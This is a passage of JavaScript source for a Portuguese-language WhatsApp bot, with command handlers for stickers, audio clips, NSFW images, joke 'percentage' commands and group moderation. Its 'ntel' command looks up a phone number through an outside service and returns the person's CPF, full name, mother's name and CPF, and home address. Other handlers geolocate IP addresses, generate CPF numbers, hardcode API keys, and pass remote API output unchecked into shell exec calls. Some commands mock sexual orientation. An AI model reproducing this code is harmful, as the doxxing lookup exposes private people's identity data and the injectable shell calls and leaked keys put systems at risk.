➳ NOME DO PRODUTO: ${anu.name}
➳ LINK: ${anu.url}
➳ DESCRIÇÃO: ${anu.description}

📌 BY: OLAF BOT `
			        reply(merc)
					break
                case 'wikin':
                    anu = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT6UOqdO-2ei6z2DRyBfYWb_JX8D1Cw6Ev0XA&usqp=CAU`)
                    client.sendMessage(from, anu, image, { quoted: mek, caption: '*Informações logo abaixo ✓*'})
                    anu = await fetchJson(`https://br.wikipedia.org/w/api.php?format=json&action=query&prop=extracts&exintro&explaintext&redirects=1&titles=${body.slice(10)}`)
			        wiki = `INFORMAÇÕS WIKIPÉDIA 🐊🚩

➳ TITULO: ${body.slice(10)}
➳ QUERY: ${anu.query}
➳ PAGINA: ${anu.to}
➳ NS: ${anu.ns}

DESCULPEM POR TER POUCAS COISAS, POIS AINDA TOU APRENDENDO SOBRE APIS. `
			        reply(wiki)
					break
//consulta					
                case 'iplog':
                    teks = body.slice(7)
                    anu = await fetchJson(`https://mnazria.herokuapp.com/api/check?ip=${teks}`)
			        ipl = `INFORMAÇÕS IP 🐊🚩

➸ *CIDADE:* ${anu.city}
➸ *Latitude*: ${anu.latitude}
➸ *Longtitude*: ${anu.longitude}
➸ *REGIÃO*: ${anu.region_name}
➸ *UF*: ${anu.region_code}
➸ *IP*: ${anu.ip}
➸ *TIPO*: ${anu.type}
➸ *CEP*: ${anu.zip}
➸ *LOCALIDADE*: ${anu.location.geoname_id}
➸ *CAPITAL*: ${anu.location.capital}
➸ *DDD*: ${anu.location.calling_code}
➸ *PAÍS*: ${anu.location.country_flag_emoji}


CRÉDITOS: 

DONO API: wa.me/+554591450728
DONO CÓDIGO: ⃬⃗𝐷𝐴𝑅𝐾⃖  ☔ `
			        reply(ipl)
					break
             case 'ntel':
                 try {
                    teks = body.slice(7)
                    parsed = await fetch(`https://hollibot.com/Syne288/tel.php?tel=${teks}&key=122345`)
                    const anu = await parsed.json()
                    const { CPF, nomePrimeiro, nomeUltimo, nomeMeio, maeNomePrimeiro, maeNomeMeio, maeNomeUltimo, maeCPF } = anu.result[0]
                    const { tipoLogradouro, logradouro, numero, complemento, bairro, cidade, uf, cep } = anu.contato.endereco[0]
                reply(`CPF: ${CPF}\nNOME: ${nomePrimeiro} ${nomeMeio} ${nomeUltimo}\nMAE: ${maeNomePrimeiro} ${maeNomeMeio} ${maeNomeUltimo}\nCPF DA MÃE: ${maeCPF}\n\nENDEREÇO: ${tipoLogradouro} ${logradouro}\nNumero Casa: ${numero}\nComplemento: ${complemento}\nBairro: ${bairro}\nCity: ${cidade} ${uf}\nCEP: ${cep}`)
                } catch (error) {
						reply(`Error na base: *${error}*`)
				}
				break
                case 'toemoj':
                    teks = body.slice(7)
                    anu = await fetchJson(`https://api.ritekit.com/v1/emoji/auto-emojify?text=${teks}&client_id=52ad7438afd2baa8779f9266a8a997cd92771f1eb625`)
			        ipl = `*TEXTO CONVERTIDO EM EMOJI*

➸ *RESULTADO:* ${anu.text}`
			        reply(ipl)
					break
                case 'pes':
                    teks = body.slice(7)
                    anu = await fetchJson(`https://triunfo.pe.gov.br/wp-json/wp/v2/posts?search=${teks}`)
			        ipl = `NOTICIAS ${teks} 🐊🚩

➸ *ID:* ${anu.id}
➸ *DATA*: ${anu.date}
➸ *LINK NOTÍCIA*: ${anu.link}
➸ *TÍTULO*: ${anu.title}
➸ *FONTE*: ${anu.slug}`
			        reply(ipl)
					break
                case 'bcnpj':
                    teks = body.slice(7)
                    res = await fetchJson(`https://www.receitaws.com.br/v1/cnpj/${teks}`)
			        cnp = `CONSULTA CNPJ 🐊🚩

 ➸ *ATIVIDADE PRINCIPAL:* ${res.atividade_principal}
 ➸ *DATA SITUAÇÃO:* ${res.data_situacao}
 ➸ *TIPO:* ${res.tipo}
 ➸ *NOME:* ${res.nome}
 ➸ *UF:* ${res.uf}
 ➸ *TELEFONE:* ${res.telefone}
 ➸ *SITUAÇÃO:* ${res.situacao}
 ➸ *BAIRRO:* ${res.bairro} 
 ➸ *RUA:* ${res.logradouro}
 ➸ *NÚMERO:* ${res.numero}
 ➸ *CEP :* ${res.cep}
 ➸ *MUNICÍPIO:* ${res.municipio}
 ➸ *PORTE:* ${res.porte}
 ➸ *ABERTURA:* ${res.abertura}
 ➸ *NATUREZA JURÍDICA:* ${res.natureza_juridica}
 ➸ *FANTASIA:* ${res.fantasia}
 ➸ *CNPJ:* ${res.cnpj}
 ➸ *ÚLTIMA ATUALIZAÇÃO:* ${res.ultima_atualizacao}
 ➸ *STATUS:* ${res.status}
 ➸ *COMPLEMENTO:* ${res.complemento}
 ➸ *EMAIL:* ${res.email}

CRÉDITOS: 

DONO CÓDIGO: ⃬⃗𝐷𝐴𝑅𝐾⃖  ☔ `
			        reply(cnp)
					break
                case 'bcep':
					lxrd = body.slice(6)
                    data = await fetchJson(`https://viacep.com.br/ws/${lxrd}/json/`, {method: 'get'})
                    if (data.error) return reply(data.error)
                    kiny = `*🔍CONSULTA REALIZADA🔍* \n\n ➸ *CEP:* ${data.cep} \n\n ➸ *ENDEREÇO:* ${data.logradouro}\n\n ➸ *COMPLEMENTO:* ${data.complemento} \n\n ➸ *BAIRRO:* ${data.bairro} \n\n ➸ *LOCALIDADE:* ${data.localidade} \n\n ➸ *UF:* ${data.uf}\n\n ➸ *DDD:* ${data.ddd}`
                    client.sendMessage(from, kiny, text, {quoted: mek})
                    await limitAdd(sender)
                    break
                case 'bpl':
                    teks = body.slice(7)
                    anu = await fetchJson(`https://apicarros.com/v1/consulta/${teks}/json/`)
			        placa = `CONSULTA PLACA 🐊🚩

➸ *ANO:* ${anu.ano}
➸ *ANO MODELO*: ${anu.anoModelo}
➸ *CHASSI*: ${anu.chassi}
➸ *CODIGO RETORNO*: ${anu.codigoRetorno}
➸ *CODIGO SITUACAO*: ${anu.codigoSituacao}
➸ *COR*: ${anu.cor}
➸ *MARCA*: ${anu.marca}
➸ *MUNICIPIO*: ${anu.municipio}
➸ *SITUACAO*: ${anu.situacao}
➸ *UF*: ${anu.uf}


CRÉDITOS: 

DONO DA API: wa.me/+554591450728
CRIADO DA CASE: ⃬⃗𝐷𝐴𝑅𝐾⃖  ☔ `
			        reply(placa)
					break
                case 'cpfg':
                    anu = await fetchJson(`http://geradorapp.com/api/v1/cpf/generate?token=c253cb1c1864a8d8e32d5115cc5ad60b`)
			        dono1 = `CPF GERADO 🐊🚩

➳ CPF: ${anu.data.number}
➳ FORMATO: ${anu.data.number_formatted}
➳ STATUS: ${anu.data.message}

📌 BY: OLAF BOT `
			        reply(dono1)
					break
				case 'animecry':
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/cry?apikey=${TobzApi}`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
case 'onich':
tujuh = fs.readFileSync('./assets/sound7.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'ola':
tujuh = fs.readFileSync('./assets/ola.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'bv':
tujuh = fs.readFileSync('./assets/bv.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'tchau':
tujuh = fs.readFileSync('./assets/tchau.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'bem':
tujuh = fs.readFileSync('./assets/bem.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'a':
tujuh = fs.readFileSync('./assets/a.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'fdp':
tujuh = fs.readFileSync('./assets/fdp.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break      
case 'beat1':
tujuh = fs.readFileSync('./assets/beat1.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'glub':
tujuh = fs.readFileSync('./assets/glub.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'mercury':
tujuh = fs.readFileSync('./bi/mercury.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'ponta':
tujuh = fs.readFileSync('./bi/ponta.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'speak':
tujuh = fs.readFileSync('./bi/speak.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'moça':
tujuh = fs.readFileSync('./bi/moça.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'nav':
tujuh = fs.readFileSync('./bi/nav.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'dama':
tujuh = fs.readFileSync('./bi/dama.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'remedy':
tujuh = fs.readFileSync('./bi/remedy.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'cavala':
tujuh = fs.readFileSync('./bi/cavala.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'facetime':
tujuh = fs.readFileSync('./bi/facetime.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'pe':
tujuh = fs.readFileSync('./bi/pe.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'nike12':
tujuh = fs.readFileSync('./bi/nike12.mp3');
client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
//say
case 'say1':
tujuh = fs.readFileSync('./assets/say1.mp4');
client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'say2':
tujuh = fs.readFileSync('./assets/say2.mp4');
client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'say3':
tujuh = fs.readFileSync('./assets/say3.mp4');
client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'say4':
tujuh = fs.readFileSync('./assets/say4.mp4');
client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
//xxx
case 'xxx1':
tujuh = fs.readFileSync('./assets/xxx1.mp4');
client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'xxx2':
tujuh = fs.readFileSync('./assets/xxx2.mp4');
client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
//variados
case 'teto1':
tujuh = fs.readFileSync('./assets/teto1.mp4');
client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'edit1':
tujuh = fs.readFileSync('./assets/edit1.mp4');
client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'edit2':
tujuh = fs.readFileSync('./assets/edit2.mp4');
client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'edit3':
tujuh = fs.readFileSync('./assets/edit3.mp4');
client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'edit4':
tujuh = fs.readFileSync('./assets/edit4.mp4');
client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
//fazerbot
case 'vídeoaula':
tujuh = fs.readFileSync('./assets/vídeoaula.mp4');
client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case 'vídeoaula1':
tujuh = fs.readFileSync('./assets/vídeoaula1.mp4');
client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
		
				case 'hinata':

					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Hinata`, {method: 'get'})
					hina = JSON.parse(JSON.stringify(anu));
					ta =  hina[Math.floor(Math.random() * hina.length)];
					nye = await getBuffer(ta)
					client.sendMessage(from, nye, image, { caption: 'hinata!!', quoted: mek })
					await limitAdd(sender)
					break 
           case 'hobby':

					hobby = body.slice(1)
					const hob =['Desah Di Game','Ngocokin Doi','Stalking sosmed nya mantan','Kau kan gak punya hobby awokawok','Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					client.sendMessage(from, 'Questão : *'+hobby+'*\n\nResponda : '+ by, text, { quoted: mek })
					await limitAdd(sender)
					break
           case 'gay1':

					gay = body.slice(13)
		   anu = await fetchJson(`https://arugaz.herokuapp.com/api/howgay`, {method: 'get'})
		   hasil = `Veja os dados do Gay ${gay}\n\n\nPercentagem Gay : ${anu.persen}%\nAlerta!!! : gay, mas não cego`
		   reply(hasil)
		   await limitAdd(sender)
					break
                case 'nangis':

					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/cry?apikey=${TobzKey}`, {method: 'get'})
					reply('PACIENTE NGAB')
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender)
					break
					case 'cium':

					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/kiss?apikey=${TobzKey}`, {method: 'get'})
					reply('Mwahhh')
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender)
					break
					case 'peluk':

					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/hug?apikey=${TobzKey}`, {method: 'get'})
					reply('Peyukkkk')
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender)
					break	
                case 'truth':
				case 'sasuke':

					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=sasuke`, {method: 'get'})
					sasu = JSON.parse(JSON.stringify(anu));
					ke =  sasu[Math.floor(Math.random() * sasu.length)];
					nye = await getBuffer(ke)
					client.sendMessage(from, nye, image, { caption: 'sasuke!!', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'sakura':

					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=sakura`, {method: 'get'})
					sak = JSON.parse(JSON.stringify(anu));
					kura =  sak[Math.floor(Math.random() * sak.length)];
					nye = await getBuffer(kura)
					client.sendMessage(from, nye, image, { caption: 'sakura!!', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'addfoto':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply('Você quem é o dono? ')
					client.sendMessage(from, addfoto(prefix), text, { quoted: mek })
					break
			    case 'otagall3':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `*#* wa.me/${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break
				case 'meme':
					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=MEMESBRASIL`, {method: 'get'})
					ri = JSON.parse(JSON.stringify(anu));
					ze =  ri[Math.floor(Math.random() * ri.length)];
					nye = await getBuffer(ze)
					client.sendMessage(from, nye, image, { caption: 'hoje eu tou comédiante️', quoted: mek })
					await limitAdd(sender) 	
					break 
			    case 'kbbi':
					if (args.length < 1) return reply('O que você quer procurar um?')
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
					reply('De acordo com Kbbi:\n\n'+anu.result)
					break
				case 'persengay':
					if (args.length < 1) return reply('O que você quer procurar um?')
					anu = await fetchJson(`https://arugaz.herokuapp.com/api/howgay`, {method: 'get'})
					reply('De acordo com o percentual gay:\n\n'+anu.desc+anu.persen)
					break
			  case 'next':
               
                if (isGroup) return  reply( 'NÃO PODE ESTAR EM GRUPO KAK')
                await reply('Ache um companheiro >_<')
                await reply(`wa.me/${anug}`)
                await reply( `Par encontrado: 🐊\n*${prefix}next* — Encontre novos parceiros`)
                break
			case 'instaimg':
				if (!isUrl(args[0]) && !args[0].includes('www.instagram.com')) return reply(mess.error.lv)
				    anu = await fetchJson(`https://alfians-api.herokuapp.com/api/ig?url=${args[0]}`, {method: 'get'})
				    insta = getBuffer(anu.result)
				    reply(mess.wait)
				    client.sendMessage(from, insta, image, {quoted: mek})
				    await limitAdd(sender) 
				    break  
				case 'instavid':
				if (!isUrl(args[0]) && !args[0].includes('www.instagram.com')) return reply(mess.error.lv)
				    anu = await fetchJson(`https://alfians-api.herokuapp.com/api/ig?url=${args[0]}`, {method: 'get'})
				    insta = getBuffer(anu.result)
				    reply(mess.wait)
				    client.sendMessage(from, insta, video, {mimtype: 'video/mp4', filename: 'instagram'.mp3, quoted: mek})
				    await limitAdd(sender) 
				    break  
				    
				case 'instastory':
				if (args.length < 1) return reply('username??')
				if (isLimit(sender)) return reply(limitend(pushname2))
				instor = `${body.slice(12)}`
				anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/igstory?username=${instor}`, {method: 'get'})
				insta = '=========================\n'
				for (let story of anu.result) {
				insta += `• *Envio:* ${story.uploaded}\n• *Termina:* ${story.expired}\n• *Tamanho: ${story.filesize}\n• *Tipo:* ${story.type}\n• Link: ${story.url}\n=========================\n`
				}
				reply(insta.trim())
				await limitAdd(sender)
				break
                                case 'afk':
                                        tels = body.slice(4)
                                        if (args.length < 1) return reply('irmão afk por causa do que?')                                  
                                        var nom = mek.participant
                                        const tag = {
                                                text: `@${nom.split("@s.whatsapp.net")[0]} *MÉDIO AFK ${tels} NÃO PERTURBE SIM*`,
                                                contextInfo: { mentionedJid: [nom] }
                                        }
                                        client.sendMessage(from, tag, text, {quoted: mek})
                                        break 
				case 'indo10':
					if (!isPremium) return reply('Você não é um Membro Premium, entre em contato com o proprietário ou digite *.daftarvip* para comprar acesso Premium!' ,text, { quoted: mek })
					qute9 = await getBuffer(`https://i.ibb.co/z6w14Gq/32d64d819e21.png`)
					client.sendMessage(from, qute9, image, { quoted: mek, caption: 'Aqui está o Bro Baixe o seu próprio link\n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file' })
					break
case 'iri':
const irimp3 = fs.readFileSync('./assets/iri.mp3');
client.sendMessage(from, irimp3, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
				case 'bucin':
					anu = await fetchJson(`https://arugaz.herokuapp.com/api/howbucins`, {method: 'get'})
					reply('Não fique entediado:\n\n'+anu.desc)
					break
			    case 'nsfwblowjob':
				    try {
						if (!isNsfw) return reply('❌ *FALSO* ❌')
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob`, {method: 'get'})
						buffer = await getBuffer(res.result)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Não faça ingredientes para o tio comum'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERRO* ❌')
					}
					break
		        case 'gay':		
	            	if (args.length < 1) return reply('marque seus amigos!')
					rate = body.slice(1)
					const ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					const kl = ti[Math.floor(Math.random() * ti.length)]
					client.sendMessage(from, 'Como você é gay: *'+rate+'*\n\nSua porcentagem gay : '+ kl+'%', text, { quoted: mek })
					break
           case 'gado':
              client.updatePresence(from, Presence.composing) 
                random = `${Math.floor(Math.random() * 100)}`
               hasil = `Nivel de gadisse ${pushname}🐂\n\nVocê é: *${random}%* GADO(A)😛🐂`
              reply(hasil)
                break
           case 'corno':
              client.updatePresence(from, Presence.composing) 
                random = `${Math.floor(Math.random() * 100)}`
               hasil = `Nivel de cm vc é corno ${pushname}\n\nVocê é: *${random}%* CORNO(A)😂`
              reply(hasil)
                break
           case 'iludido':
              client.updatePresence(from, Presence.composing) 
                random = `${Math.floor(Math.random() * 100)}`
               hasil = `Nivel de quanto vc é iludido ${pushname}️\n\nVocê é: *${random}%* iludido(A)💔🔥`
              reply(hasil)
                break
           case 'golpe':
              client.updatePresence(from, Presence.composing) 
                random = `${Math.floor(Math.random() * 100)}`
               hasil = `Nivel de quanto vc da golpe ${pushname}\n\nVocê da: *${random}%* golpe😏🔥`
              reply(hasil)
                break
                case 'lgbt':
              client.updatePresence(from, Presence.composing) 
                random = `${Math.floor(Math.random() * 100)}`
               hasil = `O quanto você é lgbt? ${pushname}🌈\n\nVocê é: *${random}%* lgbt🌈`
              reply(hasil)
                break
                  case 'timer':
				if (args[1]=="segundo") {var timer = args[0]+"000"
				} else if (args[1]=="minuto") {var timer = args[0]+"10000"
				} else if (args[1]=="hora") {var timer = args[0]+"00000"
				} else {return reply("*escolher:*\nsegundo\nminuto\nhora")}
				setTimeout( () => {
				reply("O tempo acabou")
				}, timer)
				break
                 case 'testime':
					setTimeout( () => {
					client.sendMessage(from, 'Teste concluido', text) // ur cods
					}, 300000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, 'espera mais um pouco', text) // ur cods
					}, 120000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, 'Te mando em 5 minutos', text) // ur cods
					}, 0) // 1000 = 1s,
					break
				case 'delete':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque a msg para apagar *seja um administrador!*')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Comando recebido, excluir mensagem :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						client.deleteMessage(from, mentioned)
					} else {
						mentions(`Perintah di terima, hapus pesan : @${mentioned[0].split('@')[0]}`, mentioned, true)
						client.deleteMessage(from, mentioned)
					}
					break
				case 'openanime':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						if (isAnime) return reply('O modo anime já está ativo')
						anime.push(from)
						fs.writeFileSync('./src/anime.json', JSON.stringify(anime))
						reply('Ativado com sucesso o modo anime neste grupo ✔️')
					} else if (Number(args[0]) === 0) {
						anime.splice(from, 1)
						fs.writeFileSync('./src/anime.json', JSON.stringify(anime))
						reply('Modo anime desativado com sucesso neste grupo ✔️')
					} else {
						reply('1 para ativar, 0 para desativar')
					}
					break
			    case 'nsfwneko':
				    try {
						if (!isNsfw) return reply('❌ *FALSO* ❌')
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwneko`, {method: 'get'})
						buffer = await getBuffer(res.result)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'ni anjim'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERRO* ❌')
					}
					break
				case 'nsfwtrap':
				    try {
						if (!isNsfw) return reply('❌ *FALSO* ❌')
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwtrap`, {method: 'get'})
						buffer = await getBuffer(res.result)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'ni Anjim'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERRO* ❌')
					}
					break
				case 'animekiss':
                if (!isAnime) return reply(' *Deve ativar o modo Anime* ')
					anp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/kiss?apikey=${TobzApi}`, {method: 'get'})
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
				case 'setfoto':
                    if (!isGroup) return reply(mess.only.group)
                    if (!isGroupAdmins) return reply(mess.only.admin)
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                    media = await client.downloadAndSaveMediaMessage(mek)
                    await client.updateProfilePicture (from, media)
                    reply('Alterou com sucesso o ícone do Grupo')
                    break			
                case 'level':
					if (!isLevelingOn) return reply(mess.levelnoton)
					if (!isGroup) return reply(mess.only.group)
					const userLevel = getLevelingLevel(sender)
					const userXp = getLevelingXp(sender)
					if (userLevel === undefined && userXp === undefined) return reply(mess.levelnol)
					sem = sender.replace('@s.whatsapp.net','')
					resul = `┏━━❉ *LEVEL* ❉━━\n┣⊱ Nome : ${sem}\n┣⊱ Seu XP :  ${userXp}\n┣⊱ Seu Level : ${userLevel}\n┗━━━━━━━━━━━━`
					client.sendMessage(from, resul, text, { quoted: mek})
					.catch(async (err) => {
                    console.error(err)
                    await reply(`Error!\n${err}`)
                    })
                    break
                case 'leveling':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Boo :𝘃')
					if (args[0] === 'on') {
                    if (isLevelingOn) return reply('*O comando de level já estava ativo*')
                    _leveling.push(groupId)
                    fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                     reply(mess.levelon)
					} else if (args[0] === 'off') {
                    _leveling.splice(groupId, 1)
                    fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                     reply(mess.leveloff)
					} else {
					reply(' Use ${prefix}leveling on para ativar e  ${prefix}leveling off para desativar')
					}
					break
			    case 'tinyurl':
			    reply(mess.wait)
                    anu = await fetchJson(`https://tobz-api.herokuapp.com/api/tinyurl?url=${body.slice(9)}&apikey=${TobzApi}`)
			        tinyurl = `${anu.result}`
			        reply(tinyurl)
			        await limitAdd(sender) 
			        break 
				case 'slide':
					if (args.length < 1) return reply('*Textnya mana gan?*')
					teks = `${body.slice(7)}`
					atytyd = await getBuffer(`https://api.vhtear.com/slidingtext?text=${teks}&apikey=${VthearApi}`, {method: 'get'})
					reply(mess.wait)
					client.sendMessage(from, atytyd, video, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'cpaper':
				cpaper = `${body.slice(8)}`
				buff = await getBuffer(`https://api.arugaz.my.id/api/photooxy/text-on-burn-paper?text=${cpaper}`, {method: 'get'})
				client.sendMessage(from, buff, image, {quoted: mek})
				break 
                                case 'antilink':
                    if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('digite 1 para ativar ')
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('o anti-link está ativo')
						antilink.push(from)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
						reply('Antilink ativado com sucesso ✓')
						client.sendMessage(from,`*Atenção, antilink esta ativo, qualquer um que nao for adm mandar link, sera expulso do gp imediatamente.*`, text)
					} else if (Number(args[0]) === 0) {
						if (!isantilink) return reply('O anti-link foi desabilitado ')
						var ini = anti.clientOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
